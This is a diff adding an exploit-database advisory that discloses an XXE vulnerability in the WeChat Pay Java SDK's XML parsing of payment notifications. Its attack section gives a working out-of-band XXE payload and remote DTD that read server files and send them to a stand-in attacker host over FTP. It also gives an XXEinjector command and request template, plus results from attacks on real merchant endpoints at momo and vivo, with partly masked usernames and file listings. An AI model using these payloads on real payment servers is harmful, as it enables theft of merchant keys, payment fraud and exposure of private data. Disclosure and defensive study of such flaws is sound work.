@@ -1,0 +1,386 @@
+id: 30667
+date: 07/03/2018
+title: WeChat Pay SDK XXE Injection Vulnerability
+author: Rose Jackcode
+cves: 
+
+[Title]
+
+
+XXE  in  WeChat Pay  Sdk ( WeChat leave a backdoor on merchant websites)
+
+
+------------------------------------------
+
+
+[Background]
+
+aMobile payments surge to $9 trillion a year, changing how people shop,
+borrowaeven panhandlea,  as WSJ.com once reported.  As a payment security
+researcher, I occasionally found a perilous problem about WeChat Pay which
+I think may be esay to make use of.  Therefore, I hope to be able to
+contact with WeChat Pay quickly.
+
+
+------------------------------------------
+
+
+[Description]
+
+    When using WeChat payment merchants need providing a notification URL
+to accept asynchronous payment results. Unfortunately, WeChat
+unintentionally provides a xxe vulnerability in the JAVA version SDK which
+handles this result. The attacker can build malicious payload towards the
+notification URL to steal any information of the merchant server as he or
+she want. Once the attacker get the crucial security key (md5-key and
+merchant-Id etc.) of the merchant , he can even buy anything without paying
+by just sending forged info to deceive the merchants.
+
+WeChat can fix it by updating the SDK quite easily, however the bad side
+
+is while exposing merchants may need a long time to go for the sake of time,
+cost and skills needed.
+
+
+------------------------------------------
+
+
+[Authors]
+
+
+ 1024fresher
+
+ ------------------------------------------
+
+
+[Detail]
+
+
+   The SDK  in this page:  https://pay.weixin.qq.com/wiki/doc/api/jsapi.php
+chapter=11_1
+
+   Just in java vision:
+https://pay.weixin.qq.com/wiki/doc/api/download/WxPayAPI_JAVA_v3.zip
+
+    or
+https://drive.google.com/file/d/1AoxfkxD7Kokl0uqILaqTnGAXSUR1o6ud/view(
+Backup i1/4
+
+
+
+
+
+   README.md in  WxPayApi_JAVA_v3.zip,it show more details:
+
+
+
+   notify code example:
+
+    [
+
+        String notifyData = "....";
+
+        MyConfig config = new MyConfig();
+
+        WXPay wxpay = new WXPay(config);
+
+//conver to map
+
+        Map<String, String> notifyMap = WXPayUtil.xmlToMap(notifyData);
+
+
+        if (wxpay.isPayResultNotifySignatureValid(notifyMap)) {
+
+//do business logic
+
+        }
+
+        else {
+
+         }
+
+
+
+     ]
+
+    WXPayUtil source code
+
+   [
+
+
+  public static Map<String, String> xmlToMap(String strXML) throws
+Exception {
+
+    try {
+
+            Map<String, String> data = new HashMap<String, String>();
+
+            /*** not disabled xxe *****/
+
+            //start parse
+
+
+            DocumentBuilderFactory documentBuilderFactory =
+DocumentBuilderFactory.newInstance();
+
+            DocumentBuilder documentBuilder =
+documentBuilderFactory.newDocumentBuilder();
+
+            InputStream stream = new ByteArrayInputStream(strXML.getBytes(
+"UTF-8"));
+
+            org.w3c.dom.Document doc = documentBuilder.parse(stream);
+
+
+
+           //end parse
+
+
+
+
+
+            doc.getDocumentElement().normalize();
+
+            NodeList nodeList = doc.getDocumentElement().getChildNodes();
+
+            for (int idx = 0; idx < nodeList.getLength(); ++idx) {
+
+                Node node = nodeList.item(idx);
+
+                if (node.getNodeType() == Node.ELEMENT_NODE) {
+
+                    org.w3c.dom.Element element = (org.w3c.dom.Element) node
+;
+
+                    data.put(element.getNodeName(), element.getTextContent
+());
+
+                }
+
+            }
+
+            try {
+
+                stream.close();
+
+            } catch (Exception ex) {
+
+                // do nothing
+
+            }
+
+            return data;
+
+        } catch (Exception ex) {
+
+            WXPayUtil.getLogger().warn("Invalid XML, can not convert to
+map. Error message: {}. XML content: {}", ex.getMessage(), strXML);
+
+            throw ex;
+
+        }
+
+    }
+
+
+
+]
+
+
+
+
+
+
+
+
+------------------------------------------
+
+
+[Attack demo]
+
+
+
+Post merchant notification url with  payload:
+
+
+<?xml version="1.0" encoding="utf-8"?>
+
+<!DOCTYPE root [
+
+  <!ENTITY % attack SYSTEM "file:///etc/">
+
+  <!ENTITY % xxe SYSTEM "http://attacker:8080/shell/data.dtd">
+
+  %xxe;
+
+]>
+
+
+data.dtd:
+
+
+<!ENTITY % shell "<!ENTITY &#x25; upload SYSTEM 'ftp://attack:33/%attack;
+'>">
+
+%shell;
+
+%upload;
+
+
+
+or use  XXEinjector tool  ahttps://github.com/enjoiz/XXEinjectora
+
+
+ruby XXEinjector.rb --host=attacker --path=/etc   --file=req.txt --ssl
+
+
+req.txt :
+
+POST merchant_notification_url HTTP/1.1
+
+Host:  merchant_notification_url_host
+
+User-Agent: curl/7.43.0
+
+Accept: */*
+
+Content-Length: 57
+
+Content-Type: application/x-www-form-urlencoded
+
+
+XXEINJECT
+
+
+
+
+
+In order to prove this, I got 2 chinese famous company:
+
+   aamomo: Well-known chat tools like WeChat
+
+   bavivo i1/4China's famous mobile phone,that also famous in my country
+
+
+
+Example  momo :
+
+  attack:
+
+     notify url:    https://pay.immomo.com/weixin/notify
+
+              cmd:  /home/
+
+
+
+      result:
+
+
+
+      ***
+
+      logs
+
+      zhang.jiax**
+
+      zhang.shaol**
+
+      zhang.xia**
+
+      ****
+
+
+    attack:
+
+     notify url:    https://pay.immomo.com/weixin/notify
+
+              cmd:  /home/logs
+
+
+
+      result:
+
+      ***
+
+       moa-service
+
+       momotrace
+
+      ****
+
+
+Example  vivo :
+
+  attack:
+
+     notify url:   https://pay.vivo.com.cn/webpay/wechat/callback.oo
+
+              cmd: /home/
+
+
+
+      result:
+
+         tomcat
+
+
+  attack:
+
+     notify url:   https://pay.vivo.com.cn/webpay/wechat/callback.oo
+
+              cmd: /home/tomcat
+
+     result:
+
+        .bash_logout
+
+.bash_profile
+
+.bashrc
+
+logs
+
+
+ attack:
+
+     notify url:   https://pay.vivo.com.cn/webpay/wechat/callback.oo
+
+              cmd: /home/tomcat/logs
+
+     result:
+
+           ****
+
+           tomcat-2018-06-28.log
+
+  tomcat-2018-06-29.log
+
+  tomcat-2018-06-30.log
+
+           *****
+
+
+
+
+
+
+
+
+------------------------------------------
+
+
+[Reference]
+
+
+https://www.youtube.com/watch?v=BZOg_NgvP18
+
+https://www.blackhat.com/docs/us-15/materials/us-15-Wang-FileCry-The-New-Age-Of-XXE-java-wp.pdf
+
+
+
+Regards,
+
+
+1024rosecode
+
+#  0day.today [2023-03-27]  #
